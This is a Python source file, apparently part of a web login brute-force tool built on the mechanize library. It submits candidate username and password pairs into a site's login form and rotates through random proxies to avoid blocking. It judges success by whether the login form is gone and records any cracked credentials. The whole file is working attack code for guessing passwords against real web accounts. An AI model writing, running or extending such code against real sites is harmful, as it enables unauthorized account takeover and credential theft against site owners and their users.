import mechanize
from core import utils, actions, tbrowser		

def submit(options, loginInfo, tryCred, result):

	#	Get login form field informations
	
	# BUG parse form issue with gmail, move to tbrowser.parseLoginForm
	frmLoginID, frmFields = loginInfo
	tryPassword, tryUsername = tryCred
	
	proc = tbrowser.startBrowser()

	#user_agent = tbrowser.useragent()
	
	for cred in list(result.queue):
		if "--reauth" not in options.extras:
			if tryUsername == cred[0]:
				return 0 # don't run if find password of username
		else:
			if tryUsername == cred[1]:
				return 0 # don't run if find password of username
	
	if options.proxy:
		#Set proxy connect
		proxyAddr = actions.randomFromList(options.proxy)
		proc.set_proxies({"http": proxyAddr})
	
	try:

		proc.open(options.url)

		#	Select login form

		proc.select_form(nr = frmLoginID)
		
		# FILLS ALL FIELDS https://stackoverflow.com/a/5389578
		
		for field, cred in zip(frmFields, tryCred):
			proc.form[field] = cred

		#page_title = proc.title()
		#	Send request
		proc.submit()

		if options.verbose:
			if options.proxy:
				utils.printf("[+] Trying: %s through %s" %(
					[tryUsername, tryPassword],
					proxyAddr),
				'norm')
			else:
				utils.printf("[+] Trying: %s" %(
					[tryUsername, tryPassword]),
				'norm')
		
		#	Reload - useful for redirect to dashboard
		proc.reload()
		#	If no login form -> success
		#	TODO improve condition to use captcha
		
		if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
			
			#proc.reload() #proc.open(options.url)
			# Reopen index url, if no login form -> loged in (??)
			# BUG: if url is login url (not index), this might not work
			# how about blocked messages?
			
			proc.reload()

			if tbrowser.parseLoginForm(proc.forms()) != loginInfo:
				utils.printf("[*] Get page: ['%s']" %(proc.title()), "good")
				if tryUsername:
					utils.printf("[*] Match found: %s" %(
						[tryUsername, tryPassword]),
					"good")

				else:
					utils.printf("[*] Password found: %s" %([tryPassword]), "good")

				if "--reauth" not in options.extras:
					result.put([tryUsername, tryPassword])
				else:
					result.put([options.url.split("/")[2], tryUsername, tryPassword])
				
			
			else:
				# IF USER PROVIDES INDEX URL, THIS CONDITION IS USAULLY TRUE
				# IF USER PROVIDES LOGIN URL, THIS CONDITION WILL NOT TRUE
				utils.printf("[x] Possibly error %s" %(
					[tryUsername, tryPassword]),
				"bad")
				utils.printf("[*] Get page: ['%s']" %(proc.title()), "bad")
				if options.verbose:
					utils.printf("[*] %s" %(proc.title()), "good")

		else:
			if options.verbose:
				if options.proxy:
					utils.printf("[-] Failed: %s through %s" %(
						[tryUsername, tryPassword],
						proxyAddr),
					"bad")
				else:
					utils.printf("[-] Failed: %s" %(
						[tryUsername, tryPassword]),
					"bad")

	except mechanize.HTTPError as error:
		#	Get blocked
		if options.verbose:
			utils.printf("[x] Attacking: %s %s" %(
				error,
				[tryUsername, tryPassword])
			, "bad")
		return False

	except Exception as error:
		if options.verbose:
			utils.printf("[x] Attacking: %s %s" %(
				error,
				[tryUsername, tryPassword]),
			"bad")
		return False
		
	finally:
		proc.close()
		return True